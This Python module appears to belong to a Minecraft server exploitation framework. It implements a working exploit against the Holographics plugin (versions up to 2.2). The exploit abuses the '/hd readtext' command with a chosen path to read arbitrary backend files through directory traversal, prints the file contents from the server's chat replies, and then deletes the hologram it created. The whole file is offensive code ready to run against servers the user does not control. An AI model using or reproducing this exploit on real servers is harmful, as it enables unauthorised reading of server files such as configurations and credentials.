from minecraft.networking.connection import Connection
import minecraft.networking.packets
from minecraft.networking.packets import Packet, clientbound, serverbound
from modules.schema import BaseExploit
import sys
import time
import random
import json
import string
from colorama import Fore, Back, Style, init


class Exploit(BaseExploit):
    """Exploit schema"""

    def __init__(self, client: Connection = None, directory: str = None):
        BaseExploit.__init__(self, client)
        self.name = "Holographics <= v2.2.*"
        self.description = "Read existing backend file paths via directory traversal"
        self.directory = directory
        if self.client:
            self.addEvent(self.chatHandler, minecraft.networking.packets.ChatMessagePacket)  #: on chat, receive event

        self.cmdCreate, self.cmdRead, self.cmdGet, self.cmdDelete = False, False, False, False
        self.counter = 0

    def chatHandler(self, chat_packet: minecraft.networking.packets.ChatMessagePacket):
        if chat_packet.field_string('position') == "SYSTEM":
            if "You created a hologram named" in chat_packet.json_data:
                self.cmdCreate = True

            if "The lines were pasted into the hologram!" in chat_packet.json_data:
                self.cmdRead = True

            if "You deleted the hologram" in chat_packet.json_data:
                self.cmdDelete = True

            if "Lines of the hologram" in chat_packet.json_data:
                print(Fore.LIGHTWHITE_EX + 'Lines of hologram: ')
                self.cmdGet = True

            if self.cmdGet:
                jsonData = json.loads(chat_packet.json_data)
                if jsonData['extra'][0]['text'].isnumeric():
                    self.counter += 1
                    print(jsonData['extra'][2]['text'])

            # print("Message (%s): %s" % (chat_packet.field_string('position'), chat_packet.json_data))

    def execute(self) -> tuple[bool, str]:
        self.client.connect()
        while not self.joined:
            time.sleep(0.1)

        holoName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))  #: randomizes name
        command = minecraft.networking.packets.ChatPacket()  #: chat packet structure

        command.message = "/hd create %s" % holoName  #: creates hologram
        self.client.write_packet(command)  #: sends message
        while not self.cmdCreate:
            time.sleep(0.1)

        command.message = f"/hd readtext %s %s" % (holoName, self.directory)  #: pastes lines from file into hologram
        self.client.write_packet(command)  #: sends message
        while not self.cmdRead:
            time.sleep(0.1)

        command.message = "/hd info %s" % holoName  #: lists all lines from hologram
        self.client.write_packet(command)  #: sends message
        while not self.cmdGet:
            time.sleep(0.1)

        command.message = "/hd delete %s" % holoName  #: lists all lines from hologram
        self.client.write_packet(command)  #: sends message
        while not self.cmdDelete:
            time.sleep(0.1)

        return True, "Success in Message"
